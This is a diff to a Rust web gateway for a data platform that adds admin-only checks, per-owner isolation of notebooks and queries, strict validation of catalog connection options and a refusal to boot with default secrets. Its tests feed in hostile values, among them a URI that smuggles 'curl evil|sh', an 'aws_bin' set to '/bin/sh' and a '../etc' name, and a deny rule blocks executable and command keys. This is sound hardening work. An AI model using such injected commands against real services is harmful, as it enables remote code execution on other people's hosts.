@@ -319,6 +319,27 @@ impl AppState {
         format!("{prefix}-{n}")
     }
 
+    /// Groups `user` belongs to, resolved from the server-side group store (the source of truth —
+    /// never the JWT body). Used to build the governance identity and to gate admin actions.
+    pub(crate) fn groups_of(&self, user: &str) -> Vec<String> {
+        self.groups
+            .lock()
+            .unwrap()
+            .iter()
+            .filter(|(_, members)| members.iter().any(|m| m == user))
+            .map(|(g, _)| g.clone())
+            .collect()
+    }
+
+    /// Whether `user` is an administrator (member of the `admins` group), resolved server-side.
+    pub(crate) fn is_admin(&self, user: &str) -> bool {
+        self.groups
+            .lock()
+            .unwrap()
+            .get("admins")
+            .is_some_and(|m| m.iter().any(|x| x == user))
+    }
+
     // Durable persistence (best-effort, off the request path). Workspace → S3; clusters +
     // connections → DynamoDB. Each collection is a single JSON blob; loads happen at startup.
 
@@ -656,8 +677,10 @@ async fn list_clusters(State(st): State<AppState>) -> Json<Vec<Cluster>> {
 
 async fn create_cluster(
     State(st): State<AppState>,
+    Extension(claims): Extension<Claims>,
     Json(body): Json<CreateCluster>,
-) -> (StatusCode, Json<Cluster>) {
+) -> Result<(StatusCode, Json<Cluster>), StatusCode> {
+    crate::authz::require_admin(&st, &claims)?;
     let id = st.new_id();
     let cluster = Cluster {
         id: id.clone(),
@@ -685,7 +708,7 @@ async fn create_cluster(
     // returns immediately while the cluster comes up — poll the list / events to watch it advance.
     st.touch(&id);
     tokio::spawn(provision(st.clone(), id));
-    (StatusCode::CREATED, Json(cluster))
+    Ok((StatusCode::CREATED, Json(cluster)))
 }
 
 /// Build the `WEFT_CATALOG_CONF` value (`;`-separated `spark.sql.catalog.<name>.*` entries) from the
@@ -1017,7 +1040,14 @@ async fn list_cluster_events(
     )
 }
 
-async fn delete_cluster(State(st): State<AppState>, Path(id): Path<String>) -> StatusCode {
+async fn delete_cluster(
+    State(st): State<AppState>,
+    Extension(claims): Extension<Claims>,
+    Path(id): Path<String>,
+) -> StatusCode {
+    if crate::authz::require_admin(&st, &claims).is_err() {
+        return StatusCode::FORBIDDEN;
+    }
     let existed = st.clusters.lock().unwrap().remove(&id).is_some();
     if !existed {
         return StatusCode::NOT_FOUND;
@@ -1030,8 +1060,10 @@ async fn delete_cluster(State(st): State<AppState>, Path(id): Path<String>) -> S
 
 async fn start_cluster(
     State(st): State<AppState>,
+    Extension(claims): Extension<Claims>,
     Path(id): Path<String>,
 ) -> Result<Json<Cluster>, StatusCode> {
+    crate::authz::require_admin(&st, &claims)?;
     let exists = st.clusters.lock().unwrap().contains_key(&id);
     if !exists {
         return Err(StatusCode::NOT_FOUND);
@@ -1053,8 +1085,10 @@ async fn start_cluster(
 
 async fn stop_cluster(
     State(st): State<AppState>,
+    Extension(claims): Extension<Claims>,
     Path(id): Path<String>,
 ) -> Result<Json<Cluster>, StatusCode> {
+    crate::authz::require_admin(&st, &claims)?;
     let exists = st.clusters.lock().unwrap().contains_key(&id);
     if !exists {
         return Err(StatusCode::NOT_FOUND);
@@ -1254,7 +1288,14 @@ async fn list_users(State(st): State<AppState>) -> Json<Vec<UserDto>> {
     Json(out)
 }
 
-async fn create_user(State(st): State<AppState>, Json(b): Json<CreateUser>) -> StatusCode {
+async fn create_user(
+    State(st): State<AppState>,
+    Extension(claims): Extension<Claims>,
+    Json(b): Json<CreateUser>,
+) -> StatusCode {
+    if crate::authz::require_admin(&st, &claims).is_err() {
+        return StatusCode::FORBIDDEN;
+    }
     let hash = match bcrypt::hash(&b.password, bcrypt::DEFAULT_COST) {
         Ok(h) => h,
         Err(_) => return StatusCode::INTERNAL_SERVER_ERROR,
@@ -1309,7 +1350,14 @@ async fn list_groups(State(st): State<AppState>) -> Json<Vec<GroupDto>> {
     Json(out)
 }
 
-async fn create_group(State(st): State<AppState>, Json(b): Json<CreateGroup>) -> StatusCode {
+async fn create_group(
+    State(st): State<AppState>,
+    Extension(claims): Extension<Claims>,
+    Json(b): Json<CreateGroup>,
+) -> StatusCode {
+    if crate::authz::require_admin(&st, &claims).is_err() {
+        return StatusCode::FORBIDDEN;
+    }
     st.groups.lock().unwrap().insert(b.name, b.members);
     StatusCode::CREATED
 }
@@ -1337,8 +1385,11 @@ async fn list_grants(State(st): State<AppState>) -> Json<Vec<GrantDto>> {
 
 async fn create_grant(
     State(st): State<AppState>,
+    Extension(claims): Extension<Claims>,
     Json(d): Json<GrantDto>,
 ) -> Result<StatusCode, (StatusCode, String)> {
+    crate::authz::require_admin(&st, &claims)
+        .map_err(|c| (c, "admin privilege required to manage grants".into()))?;
     let grant = dto_to_grant(&d).map_err(|e| (StatusCode::BAD_REQUEST, e))?;
     let mut grants = st.grants.lock().unwrap();
     if !grants.contains(&grant) {
@@ -1347,7 +1398,14 @@ async fn create_grant(
     Ok(StatusCode::CREATED)
 }
 
-async fn revoke_grant(State(st): State<AppState>, Json(d): Json<GrantDto>) -> StatusCode {
+async fn revoke_grant(
+    State(st): State<AppState>,
+    Extension(claims): Extension<Claims>,
+    Json(d): Json<GrantDto>,
+) -> StatusCode {
+    if crate::authz::require_admin(&st, &claims).is_err() {
+        return StatusCode::FORBIDDEN;
+    }
     match dto_to_grant(&d) {
         Ok(g) => {
             st.grants.lock().unwrap().retain(|x| x != &g);
@@ -1446,7 +1504,7 @@ pub struct ConnectionInfo {
     pub kind: String,
     /// Region (for Glue) — surfaced to the UI for convenience; also present in `options`.
     pub region: Option<String>,
-    /// Full kind-specific options (Glue → `region`/`aws_bin`; Hive → `uri`). Used to rebuild the
+    /// Full kind-specific options (Glue → `region`; Hive → `uri`). Used to rebuild the
     /// provider on restart and to seed a cluster's `spark.sql.catalog.<name>.*` config.
     #[serde(default)]
     pub options: HashMap<String, String>,
@@ -1468,13 +1526,118 @@ async fn list_connections(State(st): State<AppState>) -> Json<Vec<ConnectionInfo
     Json(st.connections.lock().unwrap().clone())
 }
 
+/// Whether an option key could name an executable, filesystem path, endpoint, or command an
+/// attacker could point at arbitrary code. The motivating case is Glue's `aws_bin`, which fed
+/// `Command::new(options["aws_bin"])` — a request-controlled arbitrary-executable RCE on the
+/// gateway host. Such keys are rejected outright (defense-in-depth on top of the per-kind allowlist).
+fn is_forbidden_option_key(key: &str) -> bool {
+    let k = key.to_ascii_lowercase();
+    k == "aws_bin"
+        || k.ends_with("_bin")
+        || k.ends_with("_path")
+        || k.ends_with("_endpoint")
+        || k.ends_with("_cmd")
+        || k.ends_with("_command")
+        || k.ends_with("_exe")
+}
+
+/// A DNS-1123 label: lowercase alphanumerics and `-`, starting and ending alphanumeric, ≤ 63 chars.
+/// This is simultaneously a safe SQL/catalog identifier and a valid Kubernetes object-name component
+/// (the K8s backend derives namespace/object names from the connection name), so enforcing it here —
+/// at the builder boundary, not only at the HTTP edge — closes name-injection into both layers.
+fn is_dns1123_label(s: &str) -> bool {
+    !s.is_empty()
+        && s.len() <= 63
+        && s.bytes().next().is_some_and(|b| b.is_ascii_alphanumeric())
+        && s.bytes().last().is_some_and(|b| b.is_ascii_alphanumeric())
+        && s.bytes()
+            .all(|b| b.is_ascii_lowercase() || b.is_ascii_digit() || b == b'-')
+}
+
+/// An AWS region token: lowercase alphanumerics and `-` only (e.g. `us-west-2`).
+fn is_aws_region(s: &str) -> bool {
+    (4..=32).contains(&s.len())
+        && s.contains('-')
+        && s.bytes()
+            .all(|b| b.is_ascii_lowercase() || b.is_ascii_digit() || b == b'-')
+}
+
+/// A conservative `scheme://host[:port]` (or `host[:port]`) charset for catalog endpoints: no quotes,
+/// whitespace, or shell/label metacharacters. Keeps an endpoint inert when it is later serialized
+/// into a pod's mounted catalog-conf file or a k8s label.
+fn is_safe_endpoint(s: &str) -> bool {
+    (1..=255).contains(&s.len())
+        && s.bytes()
+            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'.' | b'-' | b'_' | b':' | b'/'))
+}
+
+/// Validate an external-catalog connection request against a **per-kind typed allowlist**: the name
+/// must be a DNS-1123 label, no forbidden (binary/path/endpoint/command) keys may appear, and every
+/// option key must be known for the kind with a value matching its expected shape. Unknown keys are
+/// rejected, not ignored. Enforced at the builder boundary so it covers the live attach path, SCIM,
+/// and persisted-connection re-registration alike.
+fn validate_connection(
+    kind: &str,
+    name: &str,
+    options: &HashMap<String, String>,
+) -> Result<(), String> {
+    if !is_dns1123_label(name) {
+        return Err(format!(
+            "invalid connection name `{name}`: must be a DNS-1123 label \
+             (lowercase alphanumerics and '-', ≤63 chars)"
+        ));
+    }
+    for k in options.keys() {
+        if is_forbidden_option_key(k) {
+            return Err(format!(
+                "option `{k}` is not allowed: binary/path/endpoint/command keys are forbidden"
+            ));
+        }
+    }
+    let bad = |key: &str| Err(format!("invalid value for option `{key}`"));
+    match kind {
+        "glue" => {
+            for (k, v) in options {
+                match k.as_str() {
+                    "region" if is_aws_region(v) => {}
+                    "region" => return bad("region"),
+                    other => {
+                        return Err(format!("unsupported glue option `{other}` (allowed: region)"))
+                    }
+                }
+            }
+        }
+        "hive" => {
+            for (k, v) in options {
+                match k.as_str() {
+                    "uri" | "thrift.uri" | "host" if is_safe_endpoint(v) => {}
+                    "uri" | "thrift.uri" | "host" => return bad(k),
+                    "port" if !v.is_empty() && v.bytes().all(|b| b.is_ascii_digit()) => {}
+                    "port" => return bad("port"),
+                    "type" if v.bytes().all(|b| b.is_ascii_alphanumeric()) => {}
+                    "type" => return bad("type"),
+                    other => {
+                        return Err(format!(
+                            "unsupported hive option `{other}` (allowed: uri, host, port, type)"
+                        ))
+                    }
+                }
+            }
+        }
+        other => return Err(format!("unsupported connection kind: {other}")),
+    }
+    Ok(())
+}
+
 /// Build a [`weft_catalog::CatalogProvider`] for a connection `kind` + `options`, used both by the
-/// live attach path and when re-registering persisted connections on startup.
+/// live attach path and when re-registering persisted connections on startup. Rejects any request
+/// that fails [`validate_connection`] before constructing a provider.
 fn build_connection_provider(
     kind: &str,
     name: &str,
     options: &HashMap<String, String>,
 ) -> Result<Arc<dyn weft_catalog::CatalogProvider>, String> {
+    validate_connection(kind, name, options)?;
     match kind {
         "glue" => Ok(Arc::new(GlueCatalog::from_config(name, options))),
         "hive" => Ok(Arc::new(
@@ -1491,8 +1654,11 @@ fn build_connection_provider(
 /// to every cluster the gateway provisions.
 async fn create_connection(
     State(st): State<AppState>,
+    Extension(claims): Extension<Claims>,
     Json(b): Json<CreateConnection>,
 ) -> Result<StatusCode, (StatusCode, String)> {
+    crate::authz::require_admin(&st, &claims)
+        .map_err(|c| (c, "admin privilege required to attach a catalog".into()))?;
     let provider = build_connection_provider(&b.kind, &b.name, &b.options)
         .map_err(|e| (StatusCode::BAD_REQUEST, e))?;
     st.engine.register_catalog(&b.name, provider);
@@ -1515,8 +1681,11 @@ async fn create_connection(
 /// provider lingers in memory until the next restart; the catalog browser filters it out by name.)
 async fn delete_connection(
     State(st): State<AppState>,
+    Extension(claims): Extension<Claims>,
     Path(name): Path<String>,
 ) -> Result<StatusCode, (StatusCode, String)> {
+    crate::authz::require_admin(&st, &claims)
+        .map_err(|c| (c, "admin privilege required to detach a catalog".into()))?;
     let removed = {
         let mut conns = st.connections.lock().unwrap();
         let before = conns.len();
@@ -1549,6 +1718,11 @@ pub struct NotebookDoc {
     pub cells: Vec<NotebookCell>,
     #[serde(default, rename = "updatedAt")]
     pub updated_at: String,
+    /// Owning principal (`Claims.sub`). Set server-side on create and preserved on save — the client
+    /// cannot change it. Authorization keys off this so a principal reaches only its own notebooks.
+    /// Legacy docs persisted before ownership existed deserialize to `""` (admin-only).
+    #[serde(default)]
+    pub owner: String,
 }
 
 /// List-view summary of a notebook (matches the web `Notebook` shape).
@@ -1572,6 +1746,9 @@ pub struct SavedQuery {
     pub sql: String,
     #[serde(default, rename = "updatedAt")]
     pub updated_at: String,
+    /// Owning principal (`Claims.sub`); see [`NotebookDoc::owner`].
+    #[serde(default)]
+    pub owner: String,
 }
 
 /// `POST /api/notebooks` body.
@@ -1590,10 +1767,15 @@ pub struct CreateQuery {
     pub sql: String,
 }
 
-async fn list_notebooks(State(st): State<AppState>) -> Json<Vec<NotebookSummary>> {
+async fn list_notebooks(
+    State(st): State<AppState>,
+    Extension(claims): Extension<Claims>,
+) -> Json<Vec<NotebookSummary>> {
+    let admin = st.is_admin(&claims.sub);
     let nbs = st.notebooks.lock().unwrap();
     Json(
         nbs.iter()
+            .filter(|n| admin || n.owner == claims.sub)
             .map(|n| NotebookSummary {
                 id: n.id.clone(),
                 name: n.name.clone(),
@@ -1602,7 +1784,7 @@ async fn list_notebooks(State(st): State<AppState>) -> Json<Vec<NotebookSummary>
                     .first()
                     .map(|c| c.kind.clone())
                     .unwrap_or_else(|| "sql".into()),
-                owner: "admin".into(),
+                owner: n.owner.clone(),
                 updated_at: n.updated_at.clone(),
                 cells: n.cells.len(),
             })
@@ -1612,6 +1794,7 @@ async fn list_notebooks(State(st): State<AppState>) -> Json<Vec<NotebookSummary>
 
 async fn create_notebook(
     State(st): State<AppState>,
+    Extension(claims): Extension<Claims>,
     Json(b): Json<CreateNotebook>,
 ) -> Json<NotebookDoc> {
     let name = if b.name.trim().is_empty() {
@@ -1628,6 +1811,7 @@ async fn create_notebook(
             source: "SELECT * FROM main.sales.lineitem LIMIT 10".into(),
         }],
         updated_at: now_iso(),
+        owner: claims.sub.clone(),
     };
     st.notebooks.lock().unwrap().push(doc.clone());
     st.save_notebooks();
@@ -1636,42 +1820,64 @@ async fn create_notebook(
 
 async fn get_notebook(
     State(st): State<AppState>,
+    Extension(claims): Extension<Claims>,
     Path(id): Path<String>,
 ) -> Result<Json<NotebookDoc>, (StatusCode, String)> {
-    st.notebooks
-        .lock()
-        .unwrap()
-        .iter()
-        .find(|n| n.id == id)
-        .cloned()
-        .map(Json)
-        .ok_or((StatusCode::NOT_FOUND, format!("no notebook `{id}`")))
+    let nbs = st.notebooks.lock().unwrap();
+    match nbs.iter().find(|n| n.id == id) {
+        // Not-found (never forbidden) when it isn't yours, so existence isn't leaked.
+        Some(n) if crate::authz::owns_or_admin(&st, &claims, &n.owner) => Ok(Json(n.clone())),
+        _ => Err((StatusCode::NOT_FOUND, format!("no notebook `{id}`"))),
+    }
 }
 
 async fn save_notebook(
     State(st): State<AppState>,
+    Extension(claims): Extension<Claims>,
     Path(id): Path<String>,
     Json(mut doc): Json<NotebookDoc>,
-) -> Json<serde_json::Value> {
-    doc.id = id.clone();
-    doc.updated_at = now_iso();
+) -> Result<Json<serde_json::Value>, StatusCode> {
     {
         let mut nbs = st.notebooks.lock().unwrap();
         match nbs.iter_mut().find(|n| n.id == id) {
-            Some(slot) => *slot = doc.clone(),
-            None => nbs.push(doc.clone()), // upsert (e.g. first save of a client-created doc)
+            Some(slot) => {
+                // Only the owner (or an admin) may overwrite; ownership is never reassigned by the
+                // client.
+                if !crate::authz::owns_or_admin(&st, &claims, &slot.owner) {
+                    return Err(StatusCode::NOT_FOUND);
+                }
+                doc.owner = slot.owner.clone();
+                doc.id = id.clone();
+                doc.updated_at = now_iso();
+                *slot = doc.clone();
+            }
+            None => {
+                // First save of a client-created doc → the saver owns it.
+                doc.owner = claims.sub.clone();
+                doc.id = id.clone();
+                doc.updated_at = now_iso();
+                nbs.push(doc.clone());
+            }
         }
     }
     st.save_notebooks();
-    Json(serde_json::json!({ "ok": true, "savedAt": doc.updated_at }))
+    Ok(Json(serde_json::json!({ "ok": true, "savedAt": doc.updated_at })))
 }
 
-async fn delete_notebook(State(st): State<AppState>, Path(id): Path<String>) -> StatusCode {
+async fn delete_notebook(
+    State(st): State<AppState>,
+    Extension(claims): Extension<Claims>,
+    Path(id): Path<String>,
+) -> StatusCode {
     let removed = {
         let mut nbs = st.notebooks.lock().unwrap();
-        let before = nbs.len();
-        nbs.retain(|n| n.id != id);
-        before != nbs.len()
+        match nbs.iter().find(|n| n.id == id) {
+            Some(n) if crate::authz::owns_or_admin(&st, &claims, &n.owner) => {
+                nbs.retain(|n| n.id != id);
+                true
+            }
+            _ => false, // missing or not yours → not-found (no existence leak)
+        }
     };
     if removed {
         st.save_notebooks();
@@ -1681,11 +1887,27 @@ async fn delete_notebook(State(st): State<AppState>, Path(id): Path<String>) -> 
     }
 }
 
-async fn list_queries(State(st): State<AppState>) -> Json<Vec<SavedQuery>> {
-    Json(st.queries.lock().unwrap().clone())
+async fn list_queries(
+    State(st): State<AppState>,
+    Extension(claims): Extension<Claims>,
+) -> Json<Vec<SavedQuery>> {
+    let admin = st.is_admin(&claims.sub);
+    Json(
+        st.queries
+            .lock()
+            .unwrap()
+            .iter()
+            .filter(|q| admin || q.owner == claims.sub)
+            .cloned()
+            .collect(),
+    )
 }
 
-async fn create_query(State(st): State<AppState>, Json(b): Json<CreateQuery>) -> Json<SavedQuery> {
+async fn create_query(
+    State(st): State<AppState>,
+    Extension(claims): Extension<Claims>,
+    Json(b): Json<CreateQuery>,
+) -> Json<SavedQuery> {
     let name = if b.name.trim().is_empty() {
         "Untitled query".to_string()
     } else {
@@ -1696,6 +1918,7 @@ async fn create_query(State(st): State<AppState>, Json(b): Json<CreateQuery>) ->
         name,
         sql: b.sql,
         updated_at: now_iso(),
+        owner: claims.sub.clone(),
     };
     st.queries.lock().unwrap().push(q.clone());
     st.save_queries();
@@ -1704,42 +1927,60 @@ async fn create_query(State(st): State<AppState>, Json(b): Json<CreateQuery>) ->
 
 async fn get_query(
     State(st): State<AppState>,
+    Extension(claims): Extension<Claims>,
     Path(id): Path<String>,
 ) -> Result<Json<SavedQuery>, (StatusCode, String)> {
-    st.queries
-        .lock()
-        .unwrap()
-        .iter()
-        .find(|q| q.id == id)
-        .cloned()
-        .map(Json)
-        .ok_or((StatusCode::NOT_FOUND, format!("no query `{id}`")))
+    let qs = st.queries.lock().unwrap();
+    match qs.iter().find(|q| q.id == id) {
+        Some(q) if crate::authz::owns_or_admin(&st, &claims, &q.owner) => Ok(Json(q.clone())),
+        _ => Err((StatusCode::NOT_FOUND, format!("no query `{id}`"))),
+    }
 }
 
 async fn save_query(
     State(st): State<AppState>,
+    Extension(claims): Extension<Claims>,
     Path(id): Path<String>,
     Json(mut q): Json<SavedQuery>,
-) -> Json<serde_json::Value> {
-    q.id = id.clone();
-    q.updated_at = now_iso();
+) -> Result<Json<serde_json::Value>, StatusCode> {
     {
         let mut qs = st.queries.lock().unwrap();
         match qs.iter_mut().find(|x| x.id == id) {
-            Some(slot) => *slot = q.clone(),
-            None => qs.push(q.clone()),
+            Some(slot) => {
+                if !crate::authz::owns_or_admin(&st, &claims, &slot.owner) {
+                    return Err(StatusCode::NOT_FOUND);
+                }
+                q.owner = slot.owner.clone();
+                q.id = id.clone();
+                q.updated_at = now_iso();
+                *slot = q.clone();
+            }
+            None => {
+                q.owner = claims.sub.clone();
+                q.id = id.clone();
+                q.updated_at = now_iso();
+                qs.push(q.clone());
+            }
         }
     }
     st.save_queries();
-    Json(serde_json::json!({ "ok": true, "savedAt": q.updated_at }))
+    Ok(Json(serde_json::json!({ "ok": true, "savedAt": q.updated_at })))
 }
 
-async fn delete_query(State(st): State<AppState>, Path(id): Path<String>) -> StatusCode {
+async fn delete_query(
+    State(st): State<AppState>,
+    Extension(claims): Extension<Claims>,
+    Path(id): Path<String>,
+) -> StatusCode {
     let removed = {
         let mut qs = st.queries.lock().unwrap();
-        let before = qs.len();
-        qs.retain(|q| q.id != id);
-        before != qs.len()
+        match qs.iter().find(|q| q.id == id) {
+            Some(q) if crate::authz::owns_or_admin(&st, &claims, &q.owner) => {
+                qs.retain(|q| q.id != id);
+                true
+            }
+            _ => false,
+        }
     };
     if removed {
         st.save_queries();
@@ -2116,6 +2357,30 @@ pub async fn serve(addr: &str) -> std::io::Result<()> {
     let password = std::env::var("WEFT_ADMIN_PASSWORD").unwrap_or_else(|_| "admin".into());
     let secret =
         std::env::var("WEFT_JWT_SECRET").unwrap_or_else(|_| "weft-dev-secret-change-me".into());
+    // SECURITY: refuse to boot with break-glass defaults unless explicitly in dev mode. A weak or
+    // known JWT secret lets anyone forge an `admins` token (every authz check downstream trusts the
+    // `sub`); a default admin password is an open front door. `WEFT_DEV_MODE=1` opts into the
+    // insecure local-dev defaults.
+    let dev_mode = matches!(
+        std::env::var("WEFT_DEV_MODE").as_deref(),
+        Ok("1") | Ok("true") | Ok("yes")
+    );
+    if !dev_mode {
+        if secret.len() < 32 || secret == "weft-dev-secret-change-me" {
+            return Err(std::io::Error::new(
+                std::io::ErrorKind::InvalidInput,
+                "WEFT_JWT_SECRET must be set to a strong value (≥32 bytes) in production; \
+                 set WEFT_DEV_MODE=1 to allow the insecure default for local development",
+            ));
+        }
+        if password == "admin" {
+            return Err(std::io::Error::new(
+                std::io::ErrorKind::InvalidInput,
+                "WEFT_ADMIN_PASSWORD must be changed from the default in production; \
+                 set WEFT_DEV_MODE=1 to allow it for local development",
+            ));
+        }
+    }
     let web_dir =
         PathBuf::from(std::env::var("WEFT_WEB_DIR").unwrap_or_else(|_| "web/dist".into()));
     // Cluster runtime: the `weft` binary to spawn per cluster, and the host advertised in the
@@ -2262,6 +2527,217 @@ mod tests {
             .await
             .unwrap();
         assert_eq!(resp.status(), StatusCode::OK);
+    }
+
+    #[test]
+    fn connection_validation_rejects_injection_and_unknown_keys() {
+        let opt = |pairs: &[(&str, &str)]| -> HashMap<String, String> {
+            pairs
+                .iter()
+                .map(|(k, v)| (k.to_string(), v.to_string()))
+                .collect()
+        };
+        // Valid baselines pass.
+        assert!(validate_connection("glue", "sales", &opt(&[("region", "us-east-1")])).is_ok());
+        assert!(
+            validate_connection("hive", "warehouse", &opt(&[("uri", "thrift://hms:9083")])).is_ok()
+        );
+        // RCE #2: a request-supplied `aws_bin` (or any *_bin/_path/_cmd/_endpoint key) is rejected,
+        // so it can never reach `Command::new(...)` in the Glue catalog.
+        assert!(validate_connection("glue", "sales", &opt(&[("aws_bin", "/bin/sh")])).is_err());
+        assert!(validate_connection("glue", "sales", &opt(&[("helper_path", "/x")])).is_err());
+        assert!(validate_connection("hive", "wh", &opt(&[("meta_endpoint", "x")])).is_err());
+        // Unknown keys are rejected, not silently ignored.
+        assert!(validate_connection(
+            "glue",
+            "sales",
+            &opt(&[("region", "us-east-1"), ("evil", "x")])
+        )
+        .is_err());
+        // Quote-breakout / shell-metachar payloads in a value are rejected (kept inert downstream).
+        assert!(validate_connection(
+            "hive",
+            "warehouse",
+            &opt(&[("uri", "thrift://h:9083'; curl evil|sh; #")])
+        )
+        .is_err());
+        // Names that aren't DNS-1123 labels are rejected (SQL identifier + k8s object-name safety).
+        assert!(validate_connection("glue", "Sales DB", &opt(&[("region", "us-east-1")])).is_err());
+        assert!(validate_connection("glue", "../etc", &opt(&[("region", "us-east-1")])).is_err());
+        // Unsupported kind.
+        assert!(validate_connection("redis", "x", &HashMap::new()).is_err());
+    }
+
+    /// Admin-only helper: create a (possibly non-admin) user and return the response status.
+    async fn create_user_via_admin(
+        st: &AppState,
+        admin_token: &str,
+        user: &str,
+        pass: &str,
+        groups: &[&str],
+    ) -> StatusCode {
+        let groups_json = serde_json::to_string(groups).unwrap();
+        app(st.clone())
+            .oneshot(
+                Request::post("/api/admin/users")
+                    .header("content-type", "application/json")
+                    .header("authorization", format!("Bearer {admin_token}"))
+                    .body(Body::from(format!(
+                        r#"{{"username":"{user}","password":"{pass}","groups":{groups_json}}}"#
+                    )))
+                    .unwrap(),
+            )
+            .await
+            .unwrap()
+            .status()
+    }
+
+    async fn post(st: &AppState, path: &str, token: &str, body: &str) -> StatusCode {
+        app(st.clone())
+            .oneshot(
+                Request::post(path)
+                    .header("content-type", "application/json")
+                    .header("authorization", format!("Bearer {token}"))
+                    .body(Body::from(body.to_string()))
+                    .unwrap(),
+            )
+            .await
+            .unwrap()
+            .status()
+    }
+
+    #[tokio::test]
+    async fn non_admin_is_forbidden_from_privileged_actions() {
+        let st = state();
+        let admin = login_token(&st, "admin", "secretsecret1234").await.unwrap();
+        // Admin provisions a non-admin user (empty groups).
+        assert_eq!(
+            create_user_via_admin(&st, &admin, "bob", "bobpassword12", &[]).await,
+            StatusCode::CREATED
+        );
+        let bob = login_token(&st, "bob", "bobpassword12").await.unwrap();
+
+        // Every privileged control-plane mutation is 403 for a non-admin.
+        assert_eq!(
+            post(&st, "/api/clusters", &bob, r#"{"name":"x"}"#).await,
+            StatusCode::FORBIDDEN
+        );
+        assert_eq!(
+            post(
+                &st,
+                "/api/connections",
+                &bob,
+                r#"{"name":"glue1","kind":"glue","options":{"region":"us-east-1"}}"#
+            )
+            .await,
+            StatusCode::FORBIDDEN
+        );
+        assert_eq!(
+            post(
+                &st,
+                "/api/grants",
+                &bob,
+                r#"{"securable_type":"table","securable_name":"main.sales.orders","privilege":"SELECT","principal_kind":"group","principal_id":"x","effect":"allow"}"#
+            )
+            .await,
+            StatusCode::FORBIDDEN
+        );
+        assert_eq!(
+            post(
+                &st,
+                "/api/admin/users",
+                &bob,
+                r#"{"username":"x","password":"yyyyyyyyyyyy","groups":[]}"#
+            )
+            .await,
+            StatusCode::FORBIDDEN
+        );
+        // But a non-admin can still run SQL (not an admin-gated action).
+        assert_eq!(
+            post(&st, "/api/sql", &bob, r#"{"sql":"SELECT 1"}"#).await,
+            StatusCode::OK
+        );
+    }
+
+    #[tokio::test]
+    async fn notebooks_are_owner_isolated() {
+        let st = state();
+        let admin = login_token(&st, "admin", "secretsecret1234").await.unwrap();
+        for u in ["alice", "bob"] {
+            assert_eq!(
+                create_user_via_admin(&st, &admin, u, "passwordpassword", &[]).await,
+                StatusCode::CREATED
+            );
+        }
+        let alice = login_token(&st, "alice", "passwordpassword").await.unwrap();
+        let bob = login_token(&st, "bob", "passwordpassword").await.unwrap();
+
+        // Alice creates a notebook.
+        let resp = app(st.clone())
+            .oneshot(
+                Request::post("/api/notebooks")
+                    .header("content-type", "application/json")
+                    .header("authorization", format!("Bearer {alice}"))
+                    .body(Body::from(r#"{"name":"secret nb"}"#))
+                    .unwrap(),
+            )
+            .await
+            .unwrap();
+        let id = body_json(resp).await["id"].as_str().unwrap().to_string();
+
+        let get = |token: String, path: String| {
+            let st = st.clone();
+            async move {
+                app(st)
+                    .oneshot(
+                        Request::get(path)
+                            .header("authorization", format!("Bearer {token}"))
+                            .body(Body::empty())
+                            .unwrap(),
+                    )
+                    .await
+                    .unwrap()
+            }
+        };
+
+        // IDOR: Bob cannot read Alice's notebook by id (404, not 403 — no existence leak).
+        assert_eq!(
+            get(bob.clone(), format!("/api/notebooks/{id}")).await.status(),
+            StatusCode::NOT_FOUND
+        );
+        // Bob's listing doesn't include it.
+        let list = body_json(get(bob.clone(), "/api/notebooks".into()).await).await;
+        assert!(list.as_array().unwrap().is_empty());
+        // Owner and admin can read it.
+        assert_eq!(
+            get(alice.clone(), format!("/api/notebooks/{id}"))
+                .await
+                .status(),
+            StatusCode::OK
+        );
+        assert_eq!(
+            get(admin.clone(), format!("/api/notebooks/{id}"))
+                .await
+                .status(),
+            StatusCode::OK
+        );
+        // Bob cannot delete it (404); it survives for Alice.
+        let resp = app(st.clone())
+            .oneshot(
+                Request::delete(format!("/api/notebooks/{id}"))
+                    .header("authorization", format!("Bearer {bob}"))
+                    .body(Body::empty())
+                    .unwrap(),
+            )
+            .await
+            .unwrap();
+        assert_eq!(resp.status(), StatusCode::NOT_FOUND);
+        assert_eq!(
+            get(alice.clone(), format!("/api/notebooks/{id}"))
+                .await
+                .status(),
+            StatusCode::OK
+        );
     }
 
     #[tokio::test]
